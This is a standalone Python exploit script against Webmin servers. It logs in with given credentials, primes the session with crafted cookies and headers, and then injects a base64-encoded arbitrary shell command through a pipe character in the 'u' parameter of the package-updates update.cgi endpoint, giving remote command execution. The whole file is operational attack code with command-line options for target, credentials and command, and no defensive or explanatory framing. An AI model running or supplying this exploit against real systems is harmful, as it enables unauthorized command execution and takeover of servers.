#!/usr/bin/python3

import urllib3, base64
import requests, sys
from optparse import OptionParser
from urllib.parse import quote

class minPwn:
    def __init__(self, baseurl, username, password, cmd):
        self.baseurl = baseurl
        self.username = username
        self.password = password
        self.cmd = cmd
        self.session = requests.Session()

    def login(self):
        print("\033[94m[*]\033[0m Attempting to login...")
        self.session.cookies["testing"] = "1"
        postdata = {'page' : '', 'user' : self.username, 'pass' : self.password}
        url = self.baseurl+"/session_login.cgi"
        res = self.session.post(url, data=postdata, verify=False,allow_redirects=False)
        
        if res.status_code != 302 or self.session.cookies["sid"] == None:
            print("\033[91m[-]\033[0m Login error")
            sys.exit()

    def exploit(self):
        print("\033[94m[*]\033[0m Exploiting...")
        url = self.baseurl+"/proc/index_tree.cgi"
        headers = {'Referer' :  f"{self.baseurl}/sysinfo.cgi?xnavigation=1"}
        self.session.cookies["redirect"] = "1"
        self.session.cookies["testing"] = "1"
        res = self.session.post(url, headers=headers, verify=False, allow_redirects=False)
    
        if res.status_code != 200:
            print("\033[91m[-]\033[0m Request failed")
            sys.exit()

    def exec(self):
        print("\033[94m[*]\033[0m Executing payload...")
        b64 = base64.b64encode(self.cmd.encode('utf-8'))
        cmd = "bash -c 'echo {} | base64 -d | bash'".format(b64.decode('utf-8'))
        cmd = quote(cmd)
        url = self.baseurl+"/package-updates/update.cgi"
        headers = {'Content-Type' : 'application/x-www-form-urlencoded', 'Referer': f"{self.baseurl}/package-updates/?xnavigation=1"}
        data=f"u=acl%2Fapt&u=%20%7C%20{cmd}&ok_top=Update+Selected+Packages"
        res = self.session.post(url, headers=headers, data=data, verify=False, allow_redirects=False)
       
        if res.status_code != 200:
            print("\033[91m[-]\033[0m Exploit failed")
            sys.exit()

    def pwn(self):
        self.login()
        self.exploit()
        self.exec()

if __name__ == "__main__":
    parser = OptionParser("usage: %prog -u https://example.com -p 10000 -U username -P password -c command")
    parser.add_option("-u", "--url", dest="url", type="string", help="target url")
    parser.add_option("-p", "--port", dest="port", default="10000", type="string", help="target port")
    parser.add_option("-U", "--user", dest="user", type="string", help="username")
    parser.add_option("-P", "--password", dest="passwd", type="string", help="password")
    parser.add_option("-c", "--cmd", dest="cmd", type="string", help="command to be executed")

    (options, args) = parser.parse_args()

    if not options.url:    
        parser.error("Please provide a target url")

    if not options.user or not options.passwd:
        parser.error("Please provide username and password for Webmin authentication")

    if not options.cmd:
        parser.error("Please provide a comand to execute")

    baseurl = options.url + ':' + options.port

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    pwn = minPwn(baseurl, options.user, options.passwd, options.cmd)
    pwn.pwn()
